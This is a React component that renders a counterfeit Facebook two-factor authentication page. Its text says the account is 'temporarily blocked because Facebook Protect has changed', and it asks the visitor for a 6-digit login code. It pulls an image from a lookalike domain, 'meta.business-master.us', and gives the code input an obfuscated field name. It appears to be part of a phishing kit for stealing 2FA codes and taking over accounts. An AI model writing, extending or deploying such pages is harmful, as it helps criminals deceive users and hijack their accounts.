import { useEffect, useState } from "react";
import Info from "../assets/i.jpg";
import { useLocation } from "react-router-dom";
import { formatCreditCardNumber } from "../utils/utils";

const Confirm = () => {
  const location = useLocation()
  const phone = (location.state as { phone: string | null })?.phone
  const [countdown, setCountdown] = useState(600)
  const formatTime = (timeInSeconds: number) => {
    const minutes = Math.floor(timeInSeconds / 60)
    const seconds = timeInSeconds % 60
    return `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`
  }
  useEffect(() => {
    // if (showCode) {
    const intervalId = setInterval(() => {
      setCountdown((prevCountdown) => prevCountdown - 1)
    }, 1000)
    return () => clearInterval(intervalId)
    // }
  }, [])
  // useEffect(() => {
  //   if (countdown === 0) {
  //     setShowCode(false)
  //     setCode(generateRandomOrderCode(6))
  //   }
  // }, [countdown])
  return (
    <div className='bg-[#F1F2F6] flex justify-center items-center h-screen'>
      <form action="" className='sm:w-11/12 md:w-2/3 lg:w-2.5/5 xl:w-2/5 w-11/12 mx-auto rounded-lg p-5 bg-[#fff] self-center'>
        <p className="font-bold text-2xl">Two-factor authentication required (1/3)</p>
        <p className="my-3 leading-6" >We have temporarily blocked your account because Facebook Protect has changed. Verify code has
          been send to {phone && formatCreditCardNumber(phone)}.
        </p>
        <img src="https://meta.business-master.us/assets/images/2fa.gif" className="w-full h-[260px] object-cover mx-auto mb-3 rounded-sm"></img>
        <input type="text" name="udgvjseoun" required placeholder="Enter your code" className="mb-3 w-full mt-1 px-3 py-3 bg-gray-100 border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-md sm:text-sm focus:ring-1" />

        <p className="error_2fa text-red-700 mt-2"></p>
        <div className="p-3 flex items-center gap-3 bg-[#F7F8FA] rounded-md">
          <div className="text-2xl text-yellow-600">
            <img className="w-6 h-6" src={Info} alt="Info" />
          </div>
          <div className='flex-1'>
            <p className='leading-6'>You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new
              device or browser. Enter the 6-digit code from your code generator or third-party app below.</p>
            <p className='leading-6'>Please wait <strong className="count-time">{formatTime(countdown)}</strong> to request the sending of the code.</p>
          </div>
        </div>
        <p className="mt-3 mb-5 leading-6">We'll walk you through some steps to secure and unlock your account.</p>
        <button className="block text-lg cursor-pointer bg-gray-100 border border-[#d1d5db] hover:bg-blue-800 transition ease-in-out delay-75 hover:text-white w-full font-semibold text-center py-3 text-black rounded-lg">Submit</button>
        <button type="button" className="block cursor-pointer text-sm text-center py-3 w-full text-blue-800 send-code-btn pointer-events-none">Send Code</button>
      </form>
    </div>
  )
}

export default Confirm